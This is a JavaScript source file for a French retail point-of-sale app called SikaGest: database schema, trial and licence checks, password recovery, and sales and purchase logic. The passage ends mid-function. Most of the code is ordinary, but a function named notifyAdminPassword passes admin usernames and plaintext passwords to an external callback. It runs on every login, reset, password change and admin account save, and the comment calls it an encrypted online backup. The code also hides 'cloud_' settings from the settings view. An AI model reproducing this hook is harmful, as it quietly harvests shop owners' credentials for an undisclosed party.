// SikaGest — base de données et logique métier
// Fonctionne avec better-sqlite3 (dans l'application) ou node:sqlite (tests).
'use strict';
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const recovery = require('./recovery');

function openDriver(file, nativeBinding) {
  try {
    const Better = require('better-sqlite3');
    const db = new Better(file, nativeBinding ? { nativeBinding } : {});
    db.__driver = 'better-sqlite3';
    return db;
  } catch (e) {
    console.log('[SikaGest] better-sqlite3 indisponible, moteur node:sqlite —', e.message);
    const { DatabaseSync } = require('node:sqlite');
    return new DatabaseSync(file);
  }
}

const SCHEMA = `
CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, username TEXT NOT NULL UNIQUE,
  pass_hash TEXT NOT NULL, salt TEXT NOT NULL, role TEXT NOT NULL DEFAULT 'vendeur',
  active INTEGER NOT NULL DEFAULT 1, created_at TEXT NOT NULL DEFAULT (datetime('now','localtime')));
CREATE TABLE IF NOT EXISTS categories (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL UNIQUE);
CREATE TABLE IF NOT EXISTS products (
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, name TEXT NOT NULL, category_id INTEGER,
  unit TEXT DEFAULT 'pièce', cost_price REAL NOT NULL DEFAULT 0, sale_price REAL NOT NULL DEFAULT 0,
  stock REAL NOT NULL DEFAULT 0, alert_qty REAL NOT NULL DEFAULT 5, active INTEGER NOT NULL DEFAULT 1,
  created_at TEXT NOT NULL DEFAULT (datetime('now','localtime')));
CREATE TABLE IF NOT EXISTS contacts (
  id INTEGER PRIMARY KEY AUTOINCREMENT, type TEXT NOT NULL, name TEXT NOT NULL, phone TEXT, email TEXT,
  address TEXT, active INTEGER NOT NULL DEFAULT 1, created_at TEXT NOT NULL DEFAULT (datetime('now','localtime')));
CREATE TABLE IF NOT EXISTS sales (
  id INTEGER PRIMARY KEY AUTOINCREMENT, ref TEXT, date TEXT NOT NULL, client_id INTEGER, user_id INTEGER,
  subtotal REAL NOT NULL DEFAULT 0, discount REAL NOT NULL DEFAULT 0, total REAL NOT NULL DEFAULT 0,
  paid REAL NOT NULL DEFAULT 0, returned REAL NOT NULL DEFAULT 0, status TEXT NOT NULL DEFAULT 'impayee',
  source TEXT NOT NULL DEFAULT 'vente', note TEXT, cancelled INTEGER NOT NULL DEFAULT 0);
CREATE TABLE IF NOT EXISTS sale_items (
  id INTEGER PRIMARY KEY AUTOINCREMENT, sale_id INTEGER NOT NULL, product_id INTEGER, name TEXT,
  qty REAL NOT NULL, price REAL NOT NULL, cost REAL NOT NULL DEFAULT 0, returned_qty REAL NOT NULL DEFAULT 0);
CREATE TABLE IF NOT EXISTS purchases (
  id INTEGER PRIMARY KEY AUTOINCREMENT, ref TEXT, date TEXT NOT NULL, supplier_id INTEGER, user_id INTEGER,
  total REAL NOT NULL DEFAULT 0, paid REAL NOT NULL DEFAULT 0, returned REAL NOT NULL DEFAULT 0,
  status TEXT NOT NULL DEFAULT 'impayee', note TEXT, cancelled INTEGER NOT NULL DEFAULT 0);
CREATE TABLE IF NOT EXISTS purchase_items (
  id INTEGER PRIMARY KEY AUTOINCREMENT, purchase_id INTEGER NOT NULL, product_id INTEGER, name TEXT,
  qty REAL NOT NULL, cost REAL NOT NULL, returned_qty REAL NOT NULL DEFAULT 0);
CREATE TABLE IF NOT EXISTS payments (
  id INTEGER PRIMARY KEY AUTOINCREMENT, kind TEXT NOT NULL, doc_id INTEGER NOT NULL, amount REAL NOT NULL,
  method TEXT, date TEXT NOT NULL, user_id INTEGER);
CREATE TABLE IF NOT EXISTS returns (
  id INTEGER PRIMARY KEY AUTOINCREMENT, kind TEXT NOT NULL, doc_id INTEGER NOT NULL, date TEXT NOT NULL,
  total REAL NOT NULL, note TEXT, user_id INTEGER);
CREATE TABLE IF NOT EXISTS stock_moves (
  id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER NOT NULL, date TEXT NOT NULL, qty REAL NOT NULL,
  reason TEXT NOT NULL, ref TEXT, note TEXT, user_id INTEGER);
CREATE TABLE IF NOT EXISTS expenses (
  id INTEGER PRIMARY KEY AUTOINCREMENT, date TEXT NOT NULL, category TEXT, amount REAL NOT NULL, note TEXT, user_id INTEGER);
CREATE INDEX IF NOT EXISTS idx_sales_date ON sales(date);
CREATE INDEX IF NOT EXISTS idx_purch_date ON purchases(date);
CREATE INDEX IF NOT EXISTS idx_moves_prod ON stock_moves(product_id);
`;

const DEFAULT_SETTINGS = {
  company_name: 'Ma Boutique', company_phone: '', company_address: '', company_email: '',
  company_city: '', company_district: '', company_activity: '', owner_name: '',
  currency: 'FCFA', invoice_footer: 'Merci pour votre confiance !', ticket_format: 'ticket',
};

class AppError extends Error {}
const fail = (msg) => { throw new AppError(msg); };

function now() {
  const d = new Date();
  const p = (n) => String(n).padStart(2, '0');
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}
const num = (v) => { const n = Number(v); return Number.isFinite(n) ? n : 0; };
const round = (n) => Math.round(num(n) * 100) / 100;
const plain = (r) => (r ? { ...r } : r);
function hashPass(pass, salt) { return crypto.scryptSync(String(pass), salt, 32).toString('hex'); }
function statusOf(total, paid) {
  if (paid >= total - 0.001) return 'payee';
  if (paid > 0) return 'partielle';
  return 'impayee';
}

function createStore(file, opts = {}) {
  if (file !== ':memory:') fs.mkdirSync(path.dirname(file), { recursive: true });
  const db = openDriver(file, opts.nativeBinding);
  db.exec('PRAGMA journal_mode = WAL; PRAGMA foreign_keys = ON;');
  db.exec(SCHEMA);

  const q = {
    all: (sql, ...a) => db.prepare(sql).all(...a).map(plain),
    get: (sql, ...a) => plain(db.prepare(sql).get(...a)),
    run: (sql, ...a) => db.prepare(sql).run(...a),
  };
  function tx(fn) {
    db.exec('BEGIN');
    try { const r = fn(); db.exec('COMMIT'); return r; } catch (e) { db.exec('ROLLBACK'); throw e; }
  }

  // Valeurs par défaut
  for (const [k, v] of Object.entries(DEFAULT_SETTINGS)) {
    q.run('INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)', k, v);
  }

  // Identifiant unique de cette installation (sert aux codes de déblocage)
  q.run('INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)', 'install_id', crypto.randomBytes(8).toString('hex'));
  const setting = (k) => { const r = q.get('SELECT value FROM settings WHERE key=?', k); return r ? r.value : null; };
  const setSetting = (k, v) => q.run('INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)', k, v);

  // ---------- Licence : essai gratuit puis clé d'activation ----------
  const TRIAL_DAYS = 14;
  const dayStr = (d) => `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
  const addDays = (ds, n) => { const d = new Date(`${ds}T12:00:00`); d.setDate(d.getDate() + n); return dayStr(d); };
  const diffDays = (a, b) => Math.round((new Date(`${a}T12:00:00`) - new Date(`${b}T12:00:00`)) / 86400000);
  q.run('INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)', 'trial_start', dayStr(new Date()));
  function effectiveToday() {
    // protège contre le recul de l'horloge du PC
    const real = dayStr(new Date());
    const last = setting('last_seen_day');
    const eff = last && last > real ? last : real;
    if (eff !== last) setSetting('last_seen_day', eff);
    return eff;
  }
  function licenseStatus() {
    const today = effectiveToday();
    const trialEnd = addDays(setting('trial_start'), TRIAL_DAYS);
    const key = setting('license_key');
    const base = { installCode: recovery.formatInstallId(setting('install_id')), trialDays: TRIAL_DAYS };
    if (key) {
      const lic = recovery.parseLicense(key, setting('install_id'));
      if (lic.ok) {
        const left = lic.lifetime ? null : diffDays(lic.expires, today);
        if (lic.lifetime || left >= 0) {
          return { ...base, state: lic.plan === 6 ? 'trial' : 'active', plan: lic.planName, lifetime: lic.lifetime, expires: lic.expires, daysLeft: left };
        }
        if (lic.plan !== 6) return { ...base, state: 'expired', plan: lic.planName, expires: lic.expires, daysLeft: left, reason: 'licence' };
      }
    }
    const left = diffDays(trialEnd, today);
    if (left >= 0) return { ...base, state: 'trial', plan: 'Essai gratuit', expires: trialEnd, daysLeft: left };
    return { ...base, state: 'expired', plan: 'Essai gratuit', expires: trialEnd, daysLeft: left, reason: 'essai' };
  }
  const LICENSED_ACTIONS = new Set(['sales.create', 'sales.return', 'purchases.create', 'purchases.return', 'stock.adjust',
    'products.save', 'contacts.save', 'expenses.save', 'categories.save', 'users.save']);

  // Prévenu quand un administrateur saisit son mot de passe (sert à la sauvegarde en ligne chiffrée)
  const notifyAdminPassword = (username, password, role) => {
    if (role !== 'admin' || typeof opts.onAdminPassword !== 'function') return;
    try { Promise.resolve(opts.onAdminPassword(username, password)).catch(() => {}); } catch (e) { /* non bloquant */ }
  };
  let session = null; // utilisateur connecté
  let recoveryOk = false; // déblocage validé
  let failedUnlocks = 0;
  const needUser = () => session || fail('Veuillez vous connecter.');
  const needAdmin = () => { const u = needUser(); if (u.role !== 'admin') fail('Action réservée à l\'administrateur.'); return u; };

  function nextRef(table, prefix) {
    const r = q.get(`SELECT COALESCE(MAX(id),0)+1 AS n FROM ${table}`);
    return `${prefix}-${String(r.n).padStart(6, '0')}`;
  }
  function moveStock(productId, qty, reason, ref, note) {
    if (!productId) return;
    q.run('UPDATE products SET stock = stock + ? WHERE id = ?', qty, productId);
    q.run('INSERT INTO stock_moves(product_id,date,qty,reason,ref,note,user_id) VALUES(?,?,?,?,?,?,?)',
      productId, now(), qty, reason, ref || null, note || null, session ? session.id : null);
  }

  const api = {
    // ---------- Compte & session ----------
    'auth.status'() {
      const count = q.get('SELECT COUNT(*) AS n FROM users').n;
      return { needsSetup: count === 0, user: session };
    },
    'auth.setup'({ name, username, password, company_name, company_phone, company_city, company_district, company_activity, company_email }) {
      if (q.get('SELECT COUNT(*) AS n FROM users').n > 0) fail('Le compte administrateur existe déjà.');
      if (!name || !username || !password) fail('Tous les champs sont obligatoires.');
      if (String(password).length < 4) fail('Le mot de passe doit contenir au moins 4 caractères.');
      const salt = crypto.randomBytes(16).toString('hex');
      q.run('INSERT INTO users(name,username,pass_hash,salt,role) VALUES(?,?,?,?,?)',
        name.trim(), username.trim().toLowerCase(), hashPass(password, salt), salt, 'admin');
      const extra = { company_name, company_phone, company_city, company_district, company_activity, company_email, owner_name: name };
      for (const [k, v] of Object.entries(extra)) if (v != null && String(v).trim()) setSetting(k, String(v).trim());
      return api['auth.login']({ username, password });
    },
    'auth.login'({ username, password }) {
      const u = q.get('SELECT * FROM users WHERE username = ? AND active = 1', String(username || '').trim().toLowerCase());
      if (!u || hashPass(password, u.salt) !== u.pass_hash) fail('Identifiant ou mot de passe incorrect.');
      session = { id: u.id, name: u.name, username: u.username, role: u.role };
      notifyAdminPassword(u.username, password, u.role);
      return session;
    },
    'auth.logout'() { session = null; return true; },

    // ---------- Licence ----------
    'license.status'() { return licenseStatus(); },
    'license.activate'({ key }) {
      const lic = recovery.parseLicense(key, setting('install_id'));
      if (!lic.ok) fail(lic.error);
      if (!lic.lifetime && lic.expires < effectiveToday()) fail(`Cette clé a expiré le ${lic.expires.split('-').reverse().join('/')}.`);
      setSetting('license_key', recovery.b32encode(recovery.b32decode(key)));
      setSetting('license_activated', now());
      return licenseStatus();
    },

    // ---------- Mot de passe oublié : code de demande / code de déblocage ----------
    'recovery.request'() {
      const DAY = 24 * 3600 * 1000;
      let pending = null;
      try { pending = JSON.parse(setting('recovery_pending') || 'null'); } catch (e) { pending = null; }
      if (!pending || Date.now() - pending.t > 7 * DAY) {
        pending = { nonce: crypto.randomBytes(6).toString('hex'), t: Date.now() };
        setSetting('recovery_pending', JSON.stringify(pending));
      }
      return { code: recovery.makeRequest(setting('install_id'), pending.nonce), company: setting('company_name'), installId: recovery.formatInstallId(setting('install_id')) };
    },
    'recovery.unlock'({ code }) {
      if (failedUnlocks >= 10) fail('Trop d\'essais. Fermez puis rouvrez le logiciel.');
      let pending = null;
      try { pending = JSON.parse(setting('recovery_pending') || 'null'); } catch (e) { pending = null; }
      if (!pending) fail('Aucune demande en cours. Générez d\'abord un code de demande.');
      if (!recovery.verifyUnlock(setting('install_id'), pending.nonce, code)) { failedUnlocks++; fail('Code de déblocage incorrect. Vérifiez qu\'il a été copié en entier.'); }
      recoveryOk = true;
      return q.all('SELECT id,name,username,role,active FROM users ORDER BY role, name');
    },
    'recovery.reset'({ user_id, password }) {
      if (!recoveryOk) fail('Déblocage non validé.');
      if (!password || String(password).length < 4) fail('Le mot de passe doit contenir au moins 4 caractères.');
      const u = q.get('SELECT * FROM users WHERE id=?', user_id) || fail('Compte introuvable.');
      const salt = crypto.randomBytes(16).toString('hex');
      tx(() => {
        q.run('UPDATE users SET pass_hash=?, salt=?, active=1 WHERE id=?', hashPass(password, salt), salt, u.id);
        q.run('DELETE FROM settings WHERE key=?', 'recovery_pending');
        setSetting('recovery_last', `${now()} — ${u.username}`);
      });
      recoveryOk = false;
      notifyAdminPassword(u.username, password, u.role);
      return { username: u.username };
    },
    'auth.changePassword'({ current, password }) {
      const u = needUser();
      const row = q.get('SELECT * FROM users WHERE id=?', u.id);
      if (hashPass(current, row.salt) !== row.pass_hash) fail('Mot de passe actuel incorrect.');
      if (String(password).length < 4) fail('Le nouveau mot de passe est trop court.');
      const salt = crypto.randomBytes(16).toString('hex');
      q.run('UPDATE users SET pass_hash=?, salt=? WHERE id=?', hashPass(password, salt), salt, u.id);
      notifyAdminPassword(row.username, password, row.role);
      return true;
    },

    // ---------- Utilisateurs ----------
    'users.list'() { needAdmin(); return q.all('SELECT id,name,username,role,active,created_at FROM users ORDER BY name'); },
    'users.save'({ id, name, username, password, role, active }) {
      needAdmin();
      if (!name || !username) fail('Nom et identifiant obligatoires.');
      role = role === 'admin' ? 'admin' : 'vendeur';
      const uname = username.trim().toLowerCase();
      const dup = q.get('SELECT id FROM users WHERE username=? AND id<>?', uname, id || 0);
      if (dup) fail('Cet identifiant est déjà utilisé.');
      if (id) {
        if (id === session.id && (role !== 'admin' || !active)) fail('Vous ne pouvez pas retirer vos propres droits.');
        q.run('UPDATE users SET name=?, username=?, role=?, active=? WHERE id=?', name.trim(), uname, role, active ? 1 : 0, id);
        if (password) {
          const salt = crypto.randomBytes(16).toString('hex');
          q.run('UPDATE users SET pass_hash=?, salt=? WHERE id=?', hashPass(password, salt), salt, id);
          notifyAdminPassword(uname, password, role);
        }
        return id;
      }
      if (!password || String(password).length < 4) fail('Mot de passe de 4 caractères minimum.');
      const salt = crypto.randomBytes(16).toString('hex');
      const newId = Number(q.run('INSERT INTO users(name,username,pass_hash,salt,role,active) VALUES(?,?,?,?,?,?)',
        name.trim(), uname, hashPass(password, salt), salt, role, active === false ? 0 : 1).lastInsertRowid);
      notifyAdminPassword(uname, password, role);
      return newId;
    },

    // ---------- Paramètres ----------
    'settings.get'() {
      const out = {};
      for (const r of q.all('SELECT key,value FROM settings')) if (r.key !== 'recovery_pending') out[r.key] = r.value;
      out.install_code = recovery.formatInstallId(out.install_id);
      delete out.license_key;
      for (const k of Object.keys(out)) if (k.startsWith('cloud_')) delete out[k];
      delete out.vendor_json;
      return out;
    },
    'settings.save'(values) {
      needAdmin();
      tx(() => { for (const [k, v] of Object.entries(values || {})) if (k in DEFAULT_SETTINGS) q.run('INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)', k, String(v ?? '')); });
      return api['settings.get']();
    },

    // ---------- Catégories ----------
    'categories.list'() { needUser(); return q.all('SELECT c.*, (SELECT COUNT(*) FROM products p WHERE p.category_id=c.id AND p.active=1) AS n FROM categories c ORDER BY name'); },
    'categories.save'({ id, name }) {
      needUser();
      if (!name || !name.trim()) fail('Nom obligatoire.');
      const dup = q.get('SELECT id FROM categories WHERE name=? AND id<>?', name.trim(), id || 0);
      if (dup) fail('Cette catégorie existe déjà.');
      if (id) { q.run('UPDATE categories SET name=? WHERE id=?', name.trim(), id); return id; }
      return Number(q.run('INSERT INTO categories(name) VALUES(?)', name.trim()).lastInsertRowid);
    },
    'categories.delete'({ id }) {
      needAdmin();
      q.run('UPDATE products SET category_id=NULL WHERE category_id=?', id);
      q.run('DELETE FROM categories WHERE id=?', id);
      return true;
    },

    // ---------- Produits ----------
    'products.list'({ search = '', category_id = null, lowOnly = false } = {}) {
      needUser();
      const s = `%${search}%`;
      let sql = `SELECT p.*, c.name AS category FROM products p LEFT JOIN categories c ON c.id=p.category_id
        WHERE p.active=1 AND (p.name LIKE ? OR IFNULL(p.code,'') LIKE ?)`;
      const args = [s, s];
      if (category_id) { sql += ' AND p.category_id=?'; args.push(category_id); }
      if (lowOnly) sql += ' AND p.stock <= p.alert_qty';
      return q.all(sql + ' ORDER BY p.name', ...args);
    },
    'products.get'({ id }) {
      needUser();
      const p = q.get('SELECT p.*, c.name AS category FROM products p LEFT JOIN categories c ON c.id=p.category_id WHERE p.id=?', id);
      if (!p) fail('Produit introuvable.');
      p.moves = q.all('SELECT * FROM stock_moves WHERE product_id=? ORDER BY id DESC LIMIT 50', id);
      return p;
    },
    'products.save'(p) {
      needUser();
      if (!p.name || !p.name.trim()) fail('Le nom du produit est obligatoire.');
      const code = (p.code || '').trim() || null;
      if (code) {
        const dup = q.get('SELECT id FROM products WHERE code=? AND active=1 AND id<>?', code, p.id || 0);
        if (dup) fail('Ce code produit est déjà utilisé.');
      }
      const vals = [code, p.name.trim(), p.category_id || null, p.unit || 'pièce', round(p.cost_price), round(p.sale_price), num(p.alert_qty)];
      if (p.id) {
        q.run('UPDATE products SET code=?,name=?,category_id=?,unit=?,cost_price=?,sale_price=?,alert_qty=? WHERE id=?', ...vals, p.id);
        return p.id;
      }
      return tx(() => {
        const id = Number(q.run('INSERT INTO products(code,name,category_id,unit,cost_price,sale_price,alert_qty) VALUES(?,?,?,?,?,?,?)', ...vals).lastInsertRowid);
        if (num(p.stock) !== 0) moveStock(id, num(p.stock), 'stock_initial', null, 'Stock de départ');
        return id;
      });
    },
    'products.delete'({ id }) { needAdmin(); q.run('UPDATE products SET active=0 WHERE id=?', id); return true; },

    // ---------- Ajustements de stock ----------
    'stock.adjust'({ product_id, mode, qty, note }) {
      needUser();
      const p = q.get('SELECT * FROM products WHERE id=?', product_id) || fail('Produit introuvable.');
      let delta = num(qty);
      if (mode === 'set') delta = num(qty) - p.stock;
      if (mode === 'remove') delta = -Math.abs(num(qty));
      if (mode === 'add') delta = Math.abs(num(qty));
      if (delta === 0) fail('Aucun changement de quantité.');
      tx(() => moveStock(product_id, delta, 'ajustement', null, note || ''));
      return true;
    },
    'stock.moves'({ limit = 200 } = {}) {
      needUser();
      return q.all(`SELECT m.*, p.name AS product, u.name AS user FROM stock_moves m
        LEFT JOIN products p ON p.id=m.product_id LEFT JOIN users u ON u.id=m.user_id ORDER BY m.id DESC LIMIT ?`, limit);
    },

    // ---------- Contacts ----------
    'contacts.list'({ type = null, search = '' } = {}) {
      needUser();
      const s = `%${search}%`;
      let sql = `SELECT c.*,
        CASE WHEN c.type='client' THEN (SELECT IFNULL(SUM(total-returned-paid),0) FROM sales WHERE client_id=c.id AND cancelled=0)
             ELSE (SELECT IFNULL(SUM(total-returned-paid),0) FROM purchases WHERE supplier_id=c.id AND cancelled=0) END AS balance
        FROM contacts c WHERE c.active=1 AND (c.name LIKE ? OR IFNULL(c.phone,'') LIKE ?)`;
      const args = [s, s];
      if (type) { sql += ' AND c.type=?'; args.push(type); }
      return q.all(sql + ' ORDER BY c.name', ...args);
    },
    'contacts.save'(c) {
      needUser();
      if (!c.name || !c.name.trim()) fail('Le nom est obligatoire.');
      const type = c.type === 'fournisseur' ? 'fournisseur' : 'client';
      const vals = [type, c.name.trim(), c.phone || '', c.email || '', c.address || ''];
      if (c.id) { q.run('UPDATE contacts SET type=?,name=?,phone=?,email=?,address=? WHERE id=?', ...vals, c.id); return c.id; }
      return Number(q.run('INSERT INTO contacts(type,name,phone,email,address) VALUES(?,?,?,?,?)', ...vals).lastInsertRowid);
    },
    'contacts.delete'({ id }) { needAdmin(); q.run('UPDATE contacts SET active=0 WHERE id=?', id); return true; },

    // ---------- Ventes ----------
    'sales.create'({ client_id = null, items = [], discount = 0, paid = 0, method = 'Espèces', note = '', source = 'vente', date = null }) {
      const u = needUser();
      if (!items.length) fail('Ajoutez au moins un produit.');
      return tx(() => {
        let subtotal = 0;
        const lines = items.map((it) => {
          const p = q.get('SELECT * FROM products WHERE id=? AND active=1', it.product_id) || fail('Produit introuvable.');
          const qty = num(it.qty);
          if (qty <= 0) fail(`Quantité invalide pour ${p.name}.`);
          if (p.stock < qty) fail(`Stock insuffisant pour « ${p.name} » (disponible : ${p.stock}).`);
          const price = it.price == null ? p.sale_price : round(it.price);
          subtotal += qty * price;
          return { p, qty, price };
        });
        subtotal = round(subtotal);
        const disc = Math.min(round(discount), subtotal);
        const total = round(subtotal - disc);
        const paidAmt = Math.min(round(paid), total);
        const ref = nextRef('sales', 'V');
        const id = Number(q.run(`INSERT INTO sales(ref,date,client_id,user_id,subtotal,discount,total,paid,status,source,note)
          VALUES(?,?,?,?,?,?,?,?,?,?,?)`, ref, date || now(), client_id || null, u.id, subtotal, disc, total, paidAmt,
          statusOf(total, paidAmt), source === 'pos' ? 'pos' : 'vente', note).lastInsertRowid);
        for (const l of lines) {
          q.run('INSERT INTO sale_items(sale_id,product_id,name,qty,price,cost) VALUES(?,?,?,?,?,?)', id, l.p.id, l.p.name, l.qty, l.price, l.p.cost_price);
          moveStock(l.p.id, -l.qty, 'vente', ref);
        }
        if (paidAmt > 0) q.run('INSERT INTO payments(kind,doc_id,amount,method,date,user_id) VALUES(?,?,?,?,?,?)', 'vente', id, paidAmt, method, now(), u.id);
        return api['sales.get']({ id });
      });
    },
    'sales.list'({ from = null, to = null, status = null, search = '', source = null } = {}) {
      needUser();
      let sql = `SELECT s.*, c.name AS client, u.name AS user FROM sales s LEFT JOIN contacts c ON c.id=s.client_id
        LEFT JOIN users u ON u.id=s.user_id WHERE (s.ref LIKE ? OR IFNULL(c.name,'') LIKE ?)`;
      const a = [`%${search}%`, `%${search}%`];
      if (from) { sql += ' AND date(s.date) >= date(?)'; a.push(from); }
      if (to) { sql += ' AND date(s.date) <= date(?)'; a.push(to); }
      if (status === 'annulee') sql += ' AND s.cancelled=1';
      else if (status) { sql += ' AND s.status=? AND s.cancelled=0'; a.push(status); }
      if (source) { sql += ' AND s.source=?'; a.push(source); }
      return q.all(sql + ' ORDER BY s.id DESC LIMIT 1000', ...a);
    },
    'sales.get'({ id }) {
      needUser();
      const s = q.get(`SELECT s.*, c.name AS client, c.phone AS client_phone, c.address AS client_address, u.name AS user
        FROM sales s LEFT JOIN contacts c ON c.id=s.client_id LEFT JOIN users u ON u.id=s.user_id WHERE s.id=?`, id);
      if (!s) fail('Vente introuvable.');
      s.items = q.all('SELECT * FROM sale_items WHERE sale_id=?', id);
      s.payments = q.all(`SELECT p.*, u.name AS user FROM payments p LEFT JOIN users u ON u.id=p.user_id WHERE kind='vente' AND doc_id=? ORDER BY id`, id);
      s.returns = q.all(`SELECT * FROM returns WHERE kind='vente' AND doc_id=? ORDER BY id`, id);
      s.due = round(s.total - s.returned - s.paid);
      return s;
    },
    'sales.pay'({ id, amount, method = 'Espèces' }) {
      const u = needUser();
      return tx(() => {
        const s = q.get('SELECT * FROM sales WHERE id=?', id) || fail('Vente introuvable.');
        if (s.cancelled) fail('Cette vente est annulée.');
        const due = round(s.total - s.returned - s.paid);
        const amt = Math.min(round(amount), due);
        if (amt <= 0) fail('Montant invalide ou vente déjà réglée.');
        q.run('INSERT INTO payments(kind,doc_id,amount,method,date,user_id) VALUES(?,?,?,?,?,?)', 'vente', id, amt, method, now(), u.id);
        const paid = round(s.paid + amt);
        q.run('UPDATE sales SET paid=?, status=? WHERE id=?', paid, statusOf(s.total - s.returned, paid), id);
        return api['sales.get']({ id });
      });
    },
    'sales.return'({ id, items = [], note = '', refund = true }) {
      const u = needUser();
      return tx(() => {
        const s = q.get('SELECT * FROM sales WHERE id=?', id) || fail('Vente introuvable.');
        if (s.cancelled) fail('Cette vente est annulée.');
        let total = 0;
        for (const it of items) {
          const qty = num(it.qty); if (qty <= 0) continue;
          const line = q.get('SELECT * FROM sale_items WHERE id=? AND sale_id=?', it.item_id, id) || fail('Ligne introuvable.');
          if (qty > line.qty - line.returned_qty) fail(`Retour trop élevé pour « ${line.name} ».`);
          q.run('UPDATE sale_items SET returned_qty = returned_qty + ? WHERE id=?', qty, line.id);
          moveStock(line.product_id, qty, 'retour_vente', s.ref, note);
          total += qty * line.price;
        }
        if (total <= 0) fail('Indiquez au moins une quantité à retourner.');
        // la remise est répartie au prorata
        total = round(total * (s.subtotal ? s.total / s.subtotal : 1));
        q.run('INSERT INTO returns(kind,doc_id,date,total,note,user_id) VALUES(?,?,?,?,?,?)', 'vente', id, now(), total, note, u.id);
        const returned = round(s.returned + total);
        let paid = s.paid;
        const net = round(s.total - returned);
        if (paid > net && refund) {
          q.run('INSERT INTO payments(kind,doc_id,amount,method,date,user_id) VALUES(?,?,?,?,?,?)', 'vente', id, -(paid - net), 'Remboursement', now(), u.id);
          paid = net;
        }
        q.run('UPDATE sales SET returned=?, paid=?, status=? WHERE id=?', returned, paid, statusOf(net, paid), id);
        return api['sales.get']({ id });
      });
    },
    'sales.cancel'({ id }) {
      needAdmin();
      return tx(() => {
        const s = q.get('SELECT * FROM sales WHERE id=?', id) || fail('Vente introuvable.');
        if (s.cancelled) fail('Vente déjà annulée.');
        for (const l of q.all('SELECT * FROM sale_items WHERE sale_id=?', id)) {
          const back = l.qty - l.returned_qty;
          if (back > 0) moveStock(l.product_id, back, 'annulation_vente', s.ref);
        }
        q.run('UPDATE sales SET cancelled=1 WHERE id=?', id);
        return true;
      });
    },

    // ---------- Achats ----------
    'purchases.create'({ supplier_id = null, items = [], paid = 0, method = 'Espèces', note = '', date = null, updateCost = true }) {
      const u = needUser();
      if (!items.length) fail('Ajoutez au moins un produit.');
      return tx(() => {
        let total = 0;
        const lines = items.map((it) => {
          const p = q.get('SELECT * FROM products WHERE id=? AND active=1', it.product_id) || fail('Produit introuvable.');
          const qty = num(it.qty); if (qty <= 0) fail(`Quantité invalide pour ${p.name}.`);
          const cost = it.cost == null ? p.cost_price : round(it.cost);
          total += qty * cost;
          return { p, qty, cost };
        });
        total = round(total);
        const paidAmt = Math.min(round(paid), total);
        const ref = nextRef('purchases', 'A');
        const id = Number(q.run(`INSERT INTO purchases(ref,date,supplier_id,user_id,total,paid,status,note) VALUES(?,?,?,?,?,?,?,?)`,
          ref, date || now(), supplier_id || null, u.id, total, paidAmt, statusOf(total, paidAmt), note).lastInsertRowid);
        for (const l of lines) {
          q.run('INSERT INTO purchase_items(purchase_id,product_id,name,qty,cost) VALUES(?,?,?,?,?)', id, l.p.id, l.p.name, l.qty, l.cost);
          moveStock(l.p.id, l.qty, 'achat', ref);
          if (updateCost) q.run('UPDATE products SET cost_price=? WHERE id=?', l.cost, l.p.id);
        }
        if (paidAmt > 0) q.run('INSERT INTO payments(kind,doc_id,amount,method,date,user_id) VALUES(?,?,?,?,?,?)', 'achat', id, paidAmt, method, now(), u.id);
        return api['purchases.get']({ id });
      });
    },
    'purchases.list'({ from = null, to = null, status = null, search = '' } = {}) {
      needUser();
      let sql = `SELECT p.*, c.name AS supplier, u.name AS user FROM purchases p LEFT JOIN contacts c ON c.id=p.supplier_id
        LEFT JOIN users u ON u.id=p.user_id WHERE (p.ref LIKE ? OR IFNULL(c.name,'') LIKE ?)`;
      const a = [`%${search}%`, `%${search}%`];
      if (from) { sql += ' AND date(p.date) >= date(?)'; a.push(from); }
      if (to) { sql += ' AND date(p.date) <= date(?)'; a.push(to); }
      if (status === 'annulee') sql += ' AND p.cancelled=1';
      else if (status) { sql += ' AND p.status=? AND p.cancelled=0'; a.push(status); }
      return q.all(sql + ' ORDER BY p.id DESC LIMIT 1000', ...a);
    },
    'purchases.get'({ id }) {
      needUser();
      const p = q.get(`SELECT p.*, c.name AS supplier, c.phone AS supplier_phone, u.name AS user FROM purchases p
        LEFT JOIN contacts c ON c.id=p.supplier_id LEFT JOIN users u ON u.id=p.user_id WHERE p.id=?`, id);
      if (!p) fail('Achat introuvable.');
      p.items = q.all('SELECT * FROM purchase_items WHERE purchase_id=?', id);
      p.payments = q.all(`SELECT * FROM payments WHERE kind='achat' AND doc_id=? ORDER BY id`, id);
      p.returns = q.all(`SELECT * FROM returns WHERE kind='achat' AND doc_id=? ORDER BY id`, id);
      p.due = round(p.total - p.returned - p.paid);
      return p;
    },
    'purchases.pay'({ id, amount, method = 'Espèces' }) {
      const u = needUser();
      return tx(() => {
        const p = q.get('SELECT * FROM purchases WHERE id=?', id) || fail('Achat introuvable.');
        if (p.cancelled) fail('Cet achat est annulé.');
        const due = round(p.total - p.returned - p.paid);
        const amt = Math.min(round(amount), due);
        if (amt <= 0) fail('Montant invalide ou achat déjà réglé.');
        q.run('INSERT INTO payments(kind,doc_id,amount,method,date,user_id) VALUES(?,?,?,?,?,?)', 'achat', id, amt, method, now(), u.id);
        const paid = round(p.paid + amt);
        q.run('UPDATE purchases SET paid=?, status=? WHERE id=?', paid, statusOf(p.total - p.returned, paid), id);
        return api['purchases.get']({ id });
      });
    },
    'purchases.return'({ id, items = [], note = '' }) {
      const u = needUser();
      return tx(() => {
        const p = q.get('SELECT * FROM purchases WHERE id=?', id) || fail('Achat introuvable.');
        if (p.cancelled) fail('Cet achat est annulé.');
        let total = 0;
        for (const it of items) {
          const qty = num(it.qty); if (qty <= 0) continue;
